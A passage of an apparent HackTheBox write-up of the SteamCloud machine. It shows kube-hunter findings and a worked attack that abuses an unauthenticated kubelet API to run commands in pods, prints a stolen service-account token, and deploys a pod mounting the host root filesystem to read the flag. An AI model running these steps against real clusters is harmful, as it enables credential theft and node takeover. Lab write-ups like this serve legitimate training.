+https:<span style="color:#f92672">//</span>avd<span style="color:#f92672">.</span>aquasec<span style="color:#f92672">.</span>com<span style="color:#f92672">/</span>
+<span style="color:#f92672">+--------+---------------------+----------------------+----------------------+----------------------+----------------------+</span>
+<span style="color:#f92672">|</span> ID     <span style="color:#f92672">|</span> LOCATION            <span style="color:#f92672">|</span> MITRE CATEGORY       <span style="color:#f92672">|</span> VULNERABILITY        <span style="color:#f92672">|</span> DESCRIPTION          <span style="color:#f92672">|</span> EVIDENCE             <span style="color:#f92672">|</span>
+<span style="color:#f92672">+--------+---------------------+----------------------+----------------------+----------------------+----------------------+</span>
+<span style="color:#f92672">|</span> KHV043 <span style="color:#f92672">|</span> <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span> <span style="color:#f92672">|</span> Initial Access <span style="color:#f92672">//</span>    <span style="color:#f92672">|</span> Cluster Health       <span style="color:#f92672">|</span> By accessing the     <span style="color:#f92672">|</span> status: ok           <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> General Sensitive    <span style="color:#f92672">|</span> Disclosure           <span style="color:#f92672">|</span> open <span style="color:#f92672">/</span>healthz        <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> Information          <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> handler,             <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>     an attacker      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> could get the        <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> cluster health state <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> without              <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> authenticating       <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">+--------+---------------------+----------------------+----------------------+----------------------+----------------------+</span>
+<span style="color:#f92672">|</span> KHV036 <span style="color:#f92672">|</span> <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span> <span style="color:#f92672">|</span> Initial Access <span style="color:#f92672">//</span>    <span style="color:#f92672">|</span> Anonymous            <span style="color:#f92672">|</span> The kubelet <span style="color:#f92672">is</span>       <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> Exposed sensitive    <span style="color:#f92672">|</span> Authentication       <span style="color:#f92672">|</span> misconfigured,       <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> interfaces           <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> potentially allowing <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> secure access to all <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> requests on the      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> kubelet,             <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>     without the need <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> to authenticate      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">+--------+---------------------+----------------------+----------------------+----------------------+----------------------+</span>
+<span style="color:#f92672">|</span> KHV040 <span style="color:#f92672">|</span> <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span> <span style="color:#f92672">|</span> Execution <span style="color:#f92672">//</span> Exec    <span style="color:#f92672">|</span> Exposed Run Inside   <span style="color:#f92672">|</span> An attacker could    <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> into container       <span style="color:#f92672">|</span> Container            <span style="color:#f92672">|</span> run an arbitrary     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> command inside a     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> container            <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">+--------+---------------------+----------------------+----------------------+----------------------+----------------------+</span>
+<span style="color:#f92672">|</span> KHV052 <span style="color:#f92672">|</span> <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span> <span style="color:#f92672">|</span> Discovery <span style="color:#f92672">//</span> Access  <span style="color:#f92672">|</span> Exposed Pods         <span style="color:#f92672">|</span> An attacker could    <span style="color:#f92672">|</span> count: <span style="color:#ae81ff">8</span>             <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> Kubelet API          <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> view sensitive       <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> information about    <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> pods that are        <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>     bound to a Node  <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> using the <span style="color:#f92672">/</span>pods      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> endpoint             <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">+--------+---------------------+----------------------+----------------------+----------------------+----------------------+</span>
+<span style="color:#f92672">|</span> KHV046 <span style="color:#f92672">|</span> <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span> <span style="color:#f92672">|</span> Discovery <span style="color:#f92672">//</span> Access  <span style="color:#f92672">|</span> Exposed Kubelet      <span style="color:#f92672">|</span> Commandline flags    <span style="color:#f92672">|</span> cmdline: <span style="color:#f92672">/</span>var<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>mi <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> Kubelet API          <span style="color:#f92672">|</span> Cmdline              <span style="color:#f92672">|</span> that were passed to  <span style="color:#f92672">|</span> nikube<span style="color:#f92672">/</span>binaries<span style="color:#f92672">/</span>v1<span style="color:#ae81ff">.2</span> <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> the kubelet can be   <span style="color:#f92672">|</span> <span style="color:#ae81ff">2.3</span><span style="color:#f92672">/</span>kubelet<span style="color:#f92672">--</span>bootst  <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> obtained <span style="color:#f92672">from</span> the    <span style="color:#f92672">|</span> rap<span style="color:#f92672">-</span>kubeconfig<span style="color:#f92672">=/</span>etc<span style="color:#f92672">/</span> <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> pprof endpoints      <span style="color:#f92672">|</span> kubernetes<span style="color:#f92672">/</span>bootstrap <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> <span style="color:#f92672">...</span>                  <span style="color:#f92672">|</span>
+<span style="color:#f92672">+--------+---------------------+----------------------+----------------------+----------------------+----------------------+</span>
+<span style="color:#f92672">|</span> KHV045 <span style="color:#f92672">|</span> <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span> <span style="color:#f92672">|</span> Discovery <span style="color:#f92672">//</span> Access  <span style="color:#f92672">|</span> Exposed System Logs  <span style="color:#f92672">|</span> System logs are      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> Kubelet API          <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> exposed <span style="color:#f92672">from</span> the     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> <span style="color:#f92672">/</span>logs endpoint on    <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> the kubelet          <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">+--------+---------------------+----------------------+----------------------+----------------------+----------------------+</span>
+<span style="color:#f92672">|</span> KHV038 <span style="color:#f92672">|</span> <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span> <span style="color:#f92672">|</span> Discovery <span style="color:#f92672">//</span> Access  <span style="color:#f92672">|</span> Exposed Running Pods <span style="color:#f92672">|</span> Outputs a list of    <span style="color:#f92672">|</span> <span style="color:#ae81ff">8</span> running pods       <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> Kubelet API          <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> currently running    <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> pods,                <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>     <span style="color:#f92672">and</span> some of      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> their metadata,      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> which can reveal     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> sensitive            <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> information          <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">+--------+---------------------+----------------------+----------------------+----------------------+----------------------+</span>
+<span style="color:#f92672">|</span> KHV037 <span style="color:#f92672">|</span> <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span> <span style="color:#f92672">|</span> Discovery <span style="color:#f92672">//</span> Access  <span style="color:#f92672">|</span> Exposed Container    <span style="color:#f92672">|</span> Output logs <span style="color:#f92672">from</span> a   <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> Kubelet API          <span style="color:#f92672">|</span> Logs                 <span style="color:#f92672">|</span> running container    <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> are using the        <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> exposed              <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> <span style="color:#f92672">/</span>containerLogs       <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>        <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span> endpoint             <span style="color:#f92672">|</span>                      <span style="color:#f92672">|</span>
+<span style="color:#f92672">+--------+---------------------+----------------------+----------------------+----------------------+----------------------+</span>
+
+</code></pre></div><h1 id="pwning">PWNING</h1>
+<p>Show we know that we can get RCE to available pod in cluster if kubelet exposed. Try to get list of running pod :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl -s -k https://10.129.96.107:10250/runningpods/ <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>| jq <span style="color:#e6db74">&#39;.items[].metadata.name&#39;</span>
+
+<span style="color:#e6db74">&#34;etcd-steamcloud&#34;</span>
+<span style="color:#e6db74">&#34;nginx&#34;</span>
+<span style="color:#e6db74">&#34;coredns-78fcd69978-t2sck&#34;</span>
+<span style="color:#e6db74">&#34;kube-proxy-sk74k&#34;</span>
+<span style="color:#e6db74">&#34;storage-provisioner&#34;</span>
+<span style="color:#e6db74">&#34;kube-controller-manager-steamcloud&#34;</span>
+<span style="color:#e6db74">&#34;kube-apiserver-steamcloud&#34;</span>
+<span style="color:#e6db74">&#34;kube-scheduler-steamcloud&#34;</span>
+</code></pre></div><p>Pod that we can use for RCE is nginx and kube-proxy. Try to get service account in kube-proxy port, but sa is limited, so try to continue using sa used by nginx.
+get service account nginx :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl -XPOST -k https://10.129.96.107:10250/run/default/nginx/nginx -d <span style="color:#e6db74">&#34;cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token&#34;</span>
+
+eyJhbGciOiJSUzI1NiIsImtpZCI6Il9DclVpYUREamVUaG5sM3h5U01zYTNzRlpfTVRlRTZmdDBLQTJDMm5WeDgifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjY5MjcyMzAyLCJpYXQiOjE2Mzc3MzYzMDIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImE4ODlkYjQwLTIxM2YtNGI0Ni1hYTBlLTIzMDE2MjY5MmRhYSJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6ImEyMWQ4YzMzLTBiMjYtNDI5YS05ZjIzLTIyYTg2OWE3MThjMCJ9LCJ3YXJuYWZ0ZXIiOjE2Mzc3Mzk5MDl9LCJuYmYiOjE2Mzc3MzYzMDIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.IlqyPM0qzntJ9Jdh1YmyNE6UjIRnOgW8MM7CKNocggG6qvop7rpPQghBa_0acms9BsLqgfKiAvi97NMbgnlU3Sm_e6IKwMCxMsz5y6Bhh0miAgkK3czjtpDWw6PXAv0K7QbX2tloB0GyOJiA5rvJ6x2ERjREl-gc3Vv0kEpPIDaPHHKWNRynNQx9BIO0yFcectS2TR3Ncl3HVbSoQNb5a5YQ7JXg6z_3X_-bNugQsenyUBFUG8EK_KmUhA6CMW0EyznFAscu385yKR0T-2lu-KZ-KVHJ39ShoD3Am04fmHRK5BnBm4VZt30QtC9P5kYcqQS_M8ie2rmBFNVPqoLBOQ
+</code></pre></div><p>From here, we get nginx token and try to akses  cluster using this token.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ export TOKEN<span style="color:#f92672">=</span> &lt;token above&gt;
+
+kubectl --insecure-skip-tls-verify<span style="color:#f92672">=</span>true  <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>          --server<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://10.129.96.107:8443&#34;</span> <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>          --token<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>TOKEN<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>          get pod
+
+NAME    READY   STATUS    RESTARTS   AGE
+nginx   1/1     Running   <span style="color:#ae81ff">0</span>          23m
+
+ spec:
+    containers:
+    - image: nginx:1.14.2
+      imagePullPolicy: Never
+      name: nginx
+      ports:
+      - containerPort: <span style="color:#ae81ff">80</span>
+        protocol: TCP
+      resources: <span style="color:#f92672">{}</span>
+      terminationMessagePath: /dev/termination-log
+      terminationMessagePolicy: File
+      volumeMounts:
+      - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
+        name: kube-api-access-9jx6j
+        readOnly: true
+
+</code></pre></div><p>Create malicious pod that mount to host :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml"><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">v1</span>
+<span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Pod</span>
+<span style="color:#f92672">metadata</span>:
+  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">attacker</span>
+<span style="color:#f92672">spec</span>:
+  <span style="color:#f92672">containers</span>:
+  - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">nginx</span>
+    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">nginx:1.14.2</span>
+    <span style="color:#f92672">args</span>:
+    - <span style="color:#ae81ff">sleep</span>
+    - <span style="color:#e6db74">&#34;1000000&#34;</span>
+    <span style="color:#f92672">volumeMounts</span>:
+    - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">node-host</span>
+      <span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/node-host</span>
+  <span style="color:#f92672">volumes</span>:
+  - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">node-host</span>
+    <span style="color:#f92672">hostPath</span>:
+      <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/</span>
+      <span style="color:#f92672">type</span>: <span style="color:#ae81ff">Directory</span>
+
+<span style="color:#ae81ff">$ kubectl --insecure-skip-tls-verify=true  \</span>
+          --<span style="color:#ae81ff">server=&#34;https://10.129.96.107:8443&#34; \</span>
+          --<span style="color:#ae81ff">token=&#34;${TOKEN}&#34; \</span>
+          <span style="color:#ae81ff">apply -f attacker.yaml</span>
+
+<span style="color:#ae81ff">pod/attacker created</span>
+</code></pre></div><p>Now Try to RCE in attacker pod :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl -XPOST -k <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>https://10.129.96.107:10250/run/default/attacker/nginx <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>-d <span style="color:#e6db74">&#34;cmd=ls -la&#34;</span>
+
+total <span style="color:#ae81ff">76</span>
+drwxr-xr-x   <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Nov <span style="color:#ae81ff">24</span> 07:11 .
+drwxr-xr-x   <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Nov <span style="color:#ae81ff">24</span> 07:11 ..
+-rwxr-xr-x   <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">0</span> Nov <span style="color:#ae81ff">24</span> 07:11 .dockerenv
+drwxr-xr-x   <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> bin
+drwxr-xr-x   <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">2019</span> boot
+drwxr-xr-x   <span style="color:#ae81ff">5</span> root root  <span style="color:#ae81ff">360</span> Nov <span style="color:#ae81ff">24</span> 07:11 dev
+drwxr-xr-x   <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Nov <span style="color:#ae81ff">24</span> 07:11 etc
+drwxr-xr-x   <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">2019</span> home
+drwxr-xr-x   <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> lib
+drwxr-xr-x   <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> lib64
+drwxr-xr-x   <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> media
+drwxr-xr-x   <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> mnt
+drwxr-xr-x  <span style="color:#ae81ff">18</span> root root <span style="color:#ae81ff">4096</span> Nov <span style="color:#ae81ff">16</span> 21:09 node-host
+drwxr-xr-x   <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> opt
+dr-xr-xr-x <span style="color:#ae81ff">205</span> root root    <span style="color:#ae81ff">0</span> Nov <span style="color:#ae81ff">24</span> 07:11 proc
+drwx------   <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> root
+drwxr-xr-x   <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Nov <span style="color:#ae81ff">24</span> 07:11 run
+drwxr-xr-x   <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> sbin
+drwxr-xr-x   <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> srv
+dr-xr-xr-x  <span style="color:#ae81ff">13</span> root root    <span style="color:#ae81ff">0</span> Nov <span style="color:#ae81ff">24</span> 07:11 sys
+drwxrwxrwt   <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> tmp
+drwxr-xr-x   <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> usr
+drwxr-xr-x   <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> var
+
+$ curl -XPOST -k <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>https://10.129.96.107:10250/run/default/attacker/nginx <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>-d <span style="color:#e6db74">&#34;cmd=ls -la /node-host/root/&#34;</span>
+total <span style="color:#ae81ff">44</span>
+drwx------  <span style="color:#ae81ff">6</span> root root <span style="color:#ae81ff">4096</span> Nov <span style="color:#ae81ff">20</span> 13:42 .
+drwxr-xr-x <span style="color:#ae81ff">18</span> root root <span style="color:#ae81ff">4096</span> Nov <span style="color:#ae81ff">16</span> 21:09 ..
+lrwxrwxrwx  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">9</span> Nov <span style="color:#ae81ff">16</span> 20:06 .bash_history -&gt; /dev/null
+-rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">570</span> Jan <span style="color:#ae81ff">31</span>  <span style="color:#ae81ff">2010</span> .bashrc
+drwxr-x---  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Nov <span style="color:#ae81ff">16</span> 11:46 .kube
+drwxr-xr-x  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Nov <span style="color:#ae81ff">20</span> 12:58 .local
+drwxr-xr-x <span style="color:#ae81ff">10</span> root root <span style="color:#ae81ff">4096</span> Nov <span style="color:#ae81ff">16</span> 11:45 .minikube
+-rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">148</span> Aug <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2015</span> .profile
+-rw-r--r--  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">74</span> Nov <span style="color:#ae81ff">20</span> 12:45 .selected_editor
+-rw-------  <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1457</span> Nov <span style="color:#ae81ff">20</span> 13:42 .viminfo
+drwxr-xr-x  <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Nov <span style="color:#ae81ff">20</span> 13:42 Developments
+-rw-r--r--  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">26</span> Nov <span style="color:#ae81ff">17</span> 11:26 flag.txt
+
+
+$ curl -XPOST -k <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>https://10.129.96.107:10250/run/default/attacker/nginx <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>-d <span style="color:#e6db74">&#34;cmd=cat /node-host/root/flag.txt&#34;</span>
+
+HTB<span style="color:#f92672">{</span>dOn7_3Xpo53_Ku83L37<span style="color:#f92672">}</span>
+
+</code></pre></div><p>FLAG : <code>HTB{dOn7_3Xpo53_Ku83L37}</code></p>
+]]></content>
+        </item>
         
         <item>
             <title>Recap HTB: Shocker</title>
